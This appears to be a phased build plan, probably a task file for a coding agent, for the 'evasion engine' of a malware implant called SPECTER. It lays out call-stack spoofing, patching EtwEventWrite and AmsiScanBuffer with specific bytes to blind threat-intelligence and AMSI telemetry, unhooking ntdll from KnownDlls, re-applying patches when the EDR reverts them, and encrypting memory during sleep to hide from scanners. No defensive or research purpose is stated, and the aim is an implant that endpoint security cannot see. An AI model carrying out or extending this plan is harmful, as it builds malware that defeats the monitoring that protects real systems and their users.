# Phase 04: Evasion Engine

This phase implements the evasion engine — the architectural cornerstone of SPECTER. The evasion engine is compiled into the implant core and cannot be removed, disabled, or bypassed. Every syscall the core or any module makes is routed through this engine. It provides five capabilities: call stack spoofing (synthetic frames from legitimate DLLs with valid unwind data), ETW provider suppression (targeted patching of threat intelligence and AMSI providers), hook evasion (fresh ntdll mapping with periodic integrity verification), memory guard (RX→RW→encrypt→sleep→decrypt→RX cycle with private memory avoidance), and return address spoofing during sleep. By the end of this phase, every syscall executed by the implant has a plausible spoofed call stack, critical ETW providers are silenced, and the implant's memory footprint is indistinguishable from legitimate process memory during sleep.

## Context

The evasion engine wraps the syscall engine from Phase 02. All existing syscall wrapper functions must be updated to route through the evasion engine rather than calling spec_syscall directly. The evasion engine adds pre-call (stack spoofing, hook check) and post-call (cleanup) logic around every syscall invocation. It also manages the memory guard lifecycle that integrates with the sleep controller from Phase 03.

Implant source: `/Users/mdebaets/Documents/SPECTER/implant/`

## Tasks

- [ ] Implement call stack spoofing in `implant/core/src/evasion/stackspoof.c` and `implant/core/include/evasion.h`:
  - Create `implant/core/src/evasion/` directory for all evasion subsystem source files
  - Define `FRAME_LIBRARY` structure:
    - Array of `FRAME_ENTRY` structs: `{ PVOID code_start; PVOID code_end; PVOID unwind_info; DWORD module_hash; }`
    - Count of available frames, max capacity (256 entries)
  - `evasion_init_frames(EVASION_CONTEXT* ctx)` — build the frame library on init:
    - Walk PEB→Ldr to enumerate loaded DLLs (kernel32.dll, ntdll.dll, user32.dll, rpcrt4.dll, combase.dll)
    - For each DLL: parse PE headers to find .text section (code range) and .pdata section (unwind info / RUNTIME_FUNCTION entries)
    - Store valid frame entries (code address ranges with associated unwind data) in the frame library
    - Refresh the frame library when new DLLs are detected (on each sleep wake cycle)
  - `evasion_select_frames(FRAME_LIBRARY* lib, DWORD target_func_hash, FRAME_ENTRY* chain_out, int* count)` — select a plausible frame chain:
    - Choose frames that create a semantically plausible call path for the target syscall
    - Chain terminates at thread start address (RtlUserThreadStart or BaseThreadInitThunk)
    - Frame base pointers (RBP) form a valid ascending chain (no dangling/circular pointers)
    - Randomize frame selection within plausible constraints (different frames on each call)
  - `evasion_build_spoofed_stack(FRAME_ENTRY* chain, int count, PVOID original_rsp)` — construct the synthetic stack:
    - Write spoofed return addresses from selected frames onto the stack
    - Ensure RBP chain integrity (each frame's saved RBP points to the next frame)
    - Ensure every synthetic frame has valid .pdata unwind information so RtlVirtualUnwind produces a coherent walk
  - `evasion_restore_stack(PVOID original_rsp, PVOID saved_frames)` — restore the original stack after the syscall returns

- [ ] Implement the evasion-wrapped syscall invocation:
  - Create `implant/core/src/evasion/evasion_core.c`:
  - Define `EVASION_CONTEXT` structure:
    - `FRAME_LIBRARY frame_lib` — frame library for stack spoofing
    - `PVOID clean_ntdll` — pointer to clean ntdll mapping
    - `DWORD crc_table[16]` — CRC values for critical ntdll exports (hook detection)
    - `BOOL etw_patched` — whether ETW providers have been suppressed
    - `BOOL amsi_patched` — whether AMSI has been patched
  - `evasion_init(IMPLANT_CONTEXT* ctx)` — master initialization:
    - Initialize frame library
    - Compute initial CRC values for critical ntdll exports
    - Store evasion context in implant context
  - `evasion_syscall(EVASION_CONTEXT* ctx, DWORD func_hash, ...)` — the primary evasion-wrapped syscall function:
    1. Look up SYSCALL_ENTRY from the syscall table
    2. Select and build spoofed call stack
    3. Execute indirect syscall via spec_syscall (from Phase 02) with the spoofed stack active
    4. Restore original stack
    5. Return NTSTATUS result
    - This replaces direct calls to spec_syscall throughout the implant
  - Update all syscall wrapper functions in `implant/core/src/syscall_wrappers.c`:
    - Change from `spec_syscall(table->entries[i].ssn, table->entries[i].syscall_addr, ...)` to `evasion_syscall(ctx->evasion_ctx, HASH_NtXxx, ...)`
    - Every Nt* wrapper now routes through the evasion engine automatically

- [ ] Implement ETW suppression in `implant/core/src/evasion/etw.c`:
  - `evasion_patch_etw(EVASION_CONTEXT* ctx)` — selectively blind targeted ETW providers:
    - Target providers:
      - Microsoft-Windows-Threat-Intelligence (TI ETW)
      - Microsoft-Antimalware-Scan-Interface (AMSI ETW)
      - Microsoft-Windows-Kernel-Audit-API-Calls
    - For each target: find EtwEventWrite/EtwEventWriteEx in ntdll
    - Patch method: use NtProtectVirtualMemory (via evasion_syscall) to make the entry point writable, write `xor eax, eax; ret` (0x33 0xC0 0xC3), restore original protection
    - Save original bytes for restoration if needed
    - Patch is applied during sleep→wake transition window (in the sleep controller's wake sequence, not on a dedicated thread)
  - `evasion_check_etw_patches(EVASION_CONTEXT* ctx)` — verify patches are still in place:
    - Compare current bytes at patched locations with expected values
    - If reverted (EDR re-patched): re-apply the patch
    - Called periodically (every N sleep cycles, configurable via config)
  - `evasion_patch_amsi(EVASION_CONTEXT* ctx)` — lazy AMSI bypass:
    - Only called when a module loading the CLR is activated (not at init)
    - Load amsi.dll if not already loaded (resolve LoadLibraryA via PEB walk)
    - Find AmsiScanBuffer export
    - Patch to return AMSI_RESULT_CLEAN: `mov eax, 0x80070057; ret` (E_INVALIDARG forces clean result)
    - Save original bytes

- [ ] Implement hook evasion and integrity monitoring in `implant/core/src/evasion/hooks.c`:
  - `evasion_compute_crc(PVOID func_addr, DWORD len)` — CRC32 of the first `len` bytes at a function address
  - `evasion_init_crc_table(EVASION_CONTEXT* ctx)` — compute baseline CRC values for critical ntdll exports:
    - NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, NtMapViewOfSection, NtOpenProcess, NtCreateFile, NtQueueApcThread
    - CRC is computed from the clean ntdll mapping (known-good reference)
    - Values stored in evasion context
  - `evasion_check_hooks(EVASION_CONTEXT* ctx)` — periodic hook detection:
    - For each critical function: compute CRC of the first 16 bytes from the in-memory (PEB-loaded) ntdll
    - Compare against baseline CRC from clean mapping
    - If mismatch detected:
      1. Log the event (store for next check-in report)
      2. Re-map clean ntdll copy (NtOpenSection + NtMapViewOfSection)
      3. Re-resolve all cached SSNs from the fresh clean copy
      4. Recompute baseline CRCs
      5. Set a flag to alert the operator on next check-in
    - Called every N sleep cycles (configurable, default 5)
  - `evasion_refresh_ntdll(EVASION_CONTEXT* ctx)` — re-map clean ntdll:
    - Unmap existing clean copy (NtUnmapViewOfSection)
    - Re-map from \KnownDlls\ntdll.dll
    - Update clean_ntdll pointer in all relevant contexts

- [ ] Implement the memory guard in `implant/core/src/evasion/memguard.c`:
  - `memguard_init(EVASION_CONTEXT* ctx, PVOID implant_base, SIZE_T implant_size)` — initialize memory guard:
    - Record implant memory region (base + size)
    - Set up guard pages at region boundaries (no-access pages via NtAllocateVirtualMemory with PAGE_NOACCESS)
    - Register a VEH (Vectored Exception Handler) to detect guard page violations:
      - If access is from outside the implant: potential memory scanner detected — log and optionally evade
      - If access is from inside the implant: legitimate access — continue
  - `memguard_encrypt(EVASION_CONTEXT* ctx)` — pre-sleep memory encryption:
    1. Generate per-cycle random key (BCryptGenRandom)
    2. Flip implant memory from RX to RW (NtProtectVirtualMemory via evasion_syscall)
    3. Encrypt implant memory region with ChaCha20 using the per-cycle key
    4. Encrypt all tracked heap allocations (from sleep controller's tracking list)
    5. Encrypt the thread stack (save RSP/RBP first)
    6. Store the encryption key in a safe location (encrypted config region)
    - After this: implant memory is encrypted RW — unremarkable to memory scanners
  - `memguard_decrypt(EVASION_CONTEXT* ctx)` — post-sleep memory decryption:
    1. Decrypt implant memory region
    2. Flip memory from RW back to RX (NtProtectVirtualMemory)
    3. Decrypt heap allocations
    4. Decrypt thread stack, restore RSP/RBP
    5. Verify memory integrity (simple checksum comparison)
  - `memguard_setup_return_spoof(EVASION_CONTEXT* ctx)` — return address spoofing for the sleeping thread:
    - Before entering sleep: modify the thread's saved context so GetThreadContext/NtGetContextThread returns a return address pointing into a legitimate DLL's .text section
    - Select a plausible return address from the frame library
    - Restore actual return address on wake
  - Integrate memory guard with sleep controller:
    - Update `sleep_ekko()` in `implant/core/src/sleep.c` to call `memguard_encrypt()` before sleep and `memguard_decrypt()` after wake, replacing the raw SystemFunction032 approach with the full memory guard
    - The Ekko ROP chain now calls memguard functions instead of directly calling SystemFunction032
  - Verify `make` compiles all evasion engine code without errors
  - Run `make size` — confirm PIC blob size is still within target (with evasion engine, aim for <15KB to leave room for comms/config)
